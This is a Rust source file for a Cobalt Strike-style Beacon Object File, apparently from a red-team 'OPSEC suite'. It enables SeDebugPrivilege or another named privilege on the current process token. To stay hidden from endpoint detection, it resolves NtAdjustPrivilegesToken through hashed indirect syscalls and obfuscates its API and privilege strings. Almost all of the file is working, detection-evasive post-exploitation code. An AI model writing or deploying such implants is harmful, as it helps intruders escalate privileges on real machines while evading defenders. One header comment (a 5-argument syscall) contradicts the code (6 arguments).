// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Original C: TrustedSec/cs-remote-ops/get_priv (modified)
//
//! Enable a single token privilege on the current process token using:
//!   1. `common::token::open_current_process_token` — indirect `NtOpenProcessToken`
//!   2. DFR-resolved `LookupPrivilegeValueW` to convert privilege NAME → LUID
//!   3. Indirect `NtAdjustPrivilegesToken` (5-arg syscall via `do_syscall5`)
//!
//! Args (BeaconDataParse): `<priv-name>`. Default if no arg: `SeDebugPrivilege`.
//!
//! All privilege names and the wide string conversion happen in stack buffers
//! built from obfuscated ASCII — no plaintext "SeDebugPrivilege" / "ntdll" /
//! "advapi32" / "NtAdjust*" appears in `.rdata`.

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1134.002", name: "Access Token Manipulation: Create Process with Token", tactic: "Privilege Escalation" },
];

const TOKEN_QUERY: u32 = 0x0008;
const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
const SE_PRIVILEGE_ENABLED: u32 = 0x0002;
const STATUS_SUCCESS: i32 = 0;

#[repr(C)]
#[derive(Clone, Copy)]
struct Luid { low: u32, high: i32 }

#[repr(C)]
#[derive(Clone, Copy)]
struct LuidAndAttributes { luid: Luid, attributes: u32 }

#[repr(C)]
struct TokenPrivileges {
    privilege_count: u32,
    privileges: [LuidAndAttributes; 1],
}

dfr_fn!(
    lookup_privilege_value_w(
        system_name: *const u16,
        priv_name: *const u16,
        luid: *mut Luid,
    ) -> i32,
    module = "advapi32.dll",
    api    = "LookupPrivilegeValueW"
);

dfr_fn!(
    close_handle(handle: usize) -> i32,
    module = "kernel32.dll",
    api    = "CloseHandle"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    // Privilege name from args; default to SeDebugPrivilege if missing/empty.
    let arg = String::from(parser.get_str());
    obf! { let default_priv = "SeDebugPrivilege"; }
    let priv_ascii = if arg.is_empty() { default_priv } else { arg.as_str() };
    run_with_priv(priv_ascii)
}

fn run_with_priv(priv_ascii: &str) -> Result<(), &'static str> {
    // Convert privilege name to UTF-16 in a stack buffer
    let mut priv_wide = [0u16; 64];
    let n = common::str_util::ascii_to_wide_buf(priv_ascii.as_bytes(), &mut priv_wide);
    if n == 0 { return Err("priv name empty"); }

    // 1. Open current process token (indirect NtOpenProcessToken)
    let token = unsafe {
        common::token::open_current_process_token(TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES)
    }.map_err(|_| "token open failed")?;

    // 2. Resolve LUID for the privilege name (DFR)
    let mut luid = Luid { low: 0, high: 0 };
    let rc = unsafe {
        lookup_privilege_value_w(core::ptr::null(), priv_wide.as_ptr(), &mut luid)
    }.map_err(|_| "lookup priv failed")?;
    if rc == 0 {
        unsafe { let _ = close_handle(token as usize); };
        return Err("lookup priv unknown");
    }

    // 3. Build TOKEN_PRIVILEGES { count: 1, privileges: [{ luid, SE_PRIVILEGE_ENABLED }] }
    let tp = TokenPrivileges {
        privilege_count: 1,
        privileges: [LuidAndAttributes { luid, attributes: SE_PRIVILEGE_ENABLED }],
    };

    // 4. Indirect NtAdjustPrivilegesToken (5 args):
    //   ( TokenHandle, DisableAllPrivileges, NewState, BufferLength, PreviousState, ReturnLength )
    // Actually NtAdjustPrivilegesToken has 6 args; the 6th is ReturnLength*. Use do_syscall6.
    use common::syscalls::{SyscallEntry, resolve, do_syscall6};
    static ENTRY: SyscallEntry = SyscallEntry::new();
    const HASH: u32 = common::hash::djb2(b"NtAdjustPrivilegesToken");

    let (ssn, addr) = unsafe { resolve(&ENTRY, HASH) }
        .map_err(|_| "adjust resolve")?;

    let mut ret_len: u32 = 0;
    let status = unsafe {
        do_syscall6(
            token as usize,
            0, // DisableAllPrivileges = FALSE
            &tp as *const TokenPrivileges as usize,
            core::mem::size_of::<TokenPrivileges>(),
            0, // PreviousState (NULL)
            &mut ret_len as *mut u32 as usize,
            ssn,
            addr,
        )
    };

    unsafe { let _ = close_handle(token as usize); };

    if status != STATUS_SUCCESS {
        return Err("adjust failed");
    }

    println!("[+] Privilege enabled: {}", priv_ascii);
    Ok(())
}
